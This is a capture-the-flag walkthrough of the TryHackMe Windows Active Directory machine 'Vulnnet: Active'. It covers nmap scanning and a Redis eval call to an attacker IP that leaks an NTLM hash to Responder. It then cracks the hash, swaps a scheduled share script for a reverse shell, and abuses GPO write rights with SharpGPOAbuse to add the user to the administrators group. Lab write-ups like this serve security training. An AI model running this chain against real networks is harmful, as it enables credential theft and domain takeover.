---
title: Vulnnet-Active - THM Writeup
date: 2024-10-07 10:03
categories: [ctf, windows, medium, ad]
tags: [thm, windows, ctf, medium, ad]    # TAG names should be lowercase
---

# Machine Info

**Vulnnet: Active** from **THM** was a medium-rated Windows AD machine. It involved exploiting a vulnerable Redis server to leak the NTLM hash of the `enterprise-security` user to gain initial access. For domain controller takeover, we abused a vulnerable GPO to add our user to the **Administrators** group.

<img src="https://i.imgur.com/oxEuTJT.png">

# User
## Scanning with Nmap

First of all, we will go with Nmap to scan the whole network and check for services running on the network. To scan the entire network and find all the open ports, I use **-p-** to scan all **65535** ports with **--min-rate 10000** to scan the network faster using **nmap**. After scanning, I retrieve a list of open ports on the network and extract only the open ports using various terminal tools like **cut**, **tr**, etc.

```bash
$ nmap -p- --min-rate 10000 10.10.249.173 -oN ini.txt && cat ini.txt | cut  -d ' ' -f1 | tr -d '/tcp' | tr '\n' ','
# Open ports
53, 135, 445, 464, 6379, 49665, 49668, 49669, 49670, 49671, 49699
```

Now Let's run the depth scan on these specific ports using 

```bash
$ nmap -p53, 135, 445, 464, 6379, 49665, 49668, 49669, 49670, 49671, 49699 -sC -sV -A -T4 10.10.249.173 -oN scan.txt
```

- **-sC** is to run all the default scripts
- **-sV** for service and version detection
- **-A** to check all default things
- **-T4** for aggressive scan
- **-oN** to write the result into a specified file

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
6379/tcp  open  redis         Redis key-value store 2.8.2402
49665/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-10-01T09:17:34
|_  start_date: N/A
|_clock-skew: -1s
```


## Information Gathering

Through **Nmap** we found port **53 DN**S is open which can be used to perform zone transfer, **139 & 445 SMB** ports are open and can be used to enumerate network shares with anonymous user for initial access, **6379 Redis Server** port is opened which can be used to gain information about Redis Server and many **rpc** ports are open.

### Redis Server 6379

**Redis** is a popular open-source, in-memory key-value store used extensively for caching and fast data retrieval. While Redis is highly performant, it is often misconfigured or left exposed on the internet, making it a target for attackers during penetration testing engagements.

In our case Redis Server Redis-x64-2.8.2402 running, vulnerable to RCE, got after running **INFO** command

```bash
$ redis-cli -h 10.10.249.173
$ INFO
```
<img src="https://i.imgur.com/gV8yaIu.png">

Quick Google Search reveals that this version is vulnerable to command injection. You can learn more about it [here](http://michalszalkowski.com/security/pentesting-ports/6379-redis)  (R2)

<img src="https://i.imgur.com/blJKAx8.png">

### Redis Exploitation

Using redis vulnerability we can also steal the NTLM hash of current user. To steal the NTLM hash, we first need to run Responder.

<img src="https://i.imgur.com/AS3prwO.png">

Then run the `eval` function to make request to our responder.

```bash
$ eval "dofile('//Your-Tun0-IP/test')" 0
```

<img src="https://i.imgur.com/37jN8yq.png">

We got NTLMv2 Hash of user `enterprise-security` on our responser.

<img src="https://i.imgur.com/MUqqROe.png">

### Hash cracking using Hashcat

After saving Hash in a file and cracking it using hashcat and we discover the clear text password as **sand_0873959498**. 

```bash 
$ hashcat -m 5600 enter-prise.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

Here: 
- **-m** for mode and 5600 is a mode for NTLMv2 hash.

<img src="https://i.imgur.com/6vtYG5T.png">

### SMB Share Access

 I use these creds on SMB to check what SMB shares the user **enterprise-security** have access. We can see that we have **read** and **write** permission on `Enterprise-Share` Share.

```bash 
$ smbmap -H 10.10.249.173 -u enterprise-security -p 'sand_0873959498'
```

Here:
- **-H** for host IP address.
- **-u** for user name.
- **-p** for Password.
  
<img src="https://i.imgur.com/1Oy4cNg.png">
 
We can access these shares using **smbclient**.

```bash
$ smbclient \\\\10.10.155.208\\Enterprise-Share -U 'vulnnet.local/enterprise-security'
````

<img src="https://i.imgur.com/ssrm66l.png">

We can downlead the **PurgeIrrelevantData_1826.ps1** file to our local file system using **get** command.

## Gaining Shell using PurgeIrrelevantData_1826.ps1

The file `PurgeIrrelevantData_1826.ps1`  is removing the data in Public user's Document Directory. Because we have a write access on the share, we can update this file with our reverse shell and upload it to the Shares. Let's First generate a revershell from [revshells.com](https://revshells.com) (R3) and save it to `PurgeIrrelevantData_1826.ps1`. 

<img src="https://i.imgur.com/KWeleWi.png">

First start netcat listener on the port you specified in reverse shell and upload payload file in **SMB** shares

```bash
$ nc -lvnp 9002
```

Here:
- **-l** for listening mode.
- **-v** for verbosity.
- **-n** to use numeric IP address not domain name.
- **-p** for port number.
  
<img src="https://i.imgur.com/sIgkHIU.png">

After some time, we got connection on our listener, the file **startup.bat** was responsible to giving us shell on the box.

<img src="https://i.imgur.com/TaV4eiW.png">

You can get you user flag from `C:\Users\enterprise-security\Desktop`.

# Privilege Escalation

## Enumeration

Because it is AD machine, we will be running SharpHound and upload it's results to bloodhound for analysis and mark **enterprise-secuity** user as owned.

<img src="https://i.imgur.com/k25IdU6.png">

Then select **Shortest Path to Domain Admin form Owned Principals**. Our user enterprise-security has **genericWrite** permission on GPO **SECURITY-POL-VN**, Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user. Now we can create, update or modify the policy on which we have write permission on domain. 

<img src="https://i.imgur.com/YG1urLZ.png">

## GPO Exploitation

We can see that we are not member of any local group yet.

<img src="https://i.imgur.com/VSLbFAg.png">

But we have permissions on GPO, Let's Add our user **enterprise-security** to administrators group. To exploit this, we will be using tool called **SharpGPOAbuse** by FSecureLABS (R4). Transfer this binary either using python server or using smb shares and run the below command.

```powershell
$ ./gpo.exe --AddComputerTask --TaskName "Iamr0ot" --Author administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN" --Force
```

Here:
- **AddComputerTask** for scheduling task
- **TaskName** to set the task name
- **Author** to set the task author
- **Command** to run command like cmd or powershell
- **GPOName**, name of GPO on which we have **GenericWrite** permission.
- **-Force** to forcly add update the GPO.

<img src="https://i.imgur.com/CeBl8aN.png">

After waiting some time we can see that our use **enterprise-security** is now a member of **localgoup Administrators**.

<img src="https://i.imgur.com/PVni5TL.png">

You can read you root flag from `C:\Users\Administrator\Desktop`

# References

1. [6379 - Pentesting Redis | HackTricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)
2. [6379 - Pentesting redis - MichalSzalkowski.com/security](http://michalszalkowski.com/security/pentesting-ports/6379-redis/)
3. [Reverse Shell Generator](https://www.revshells.com)
4. [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)
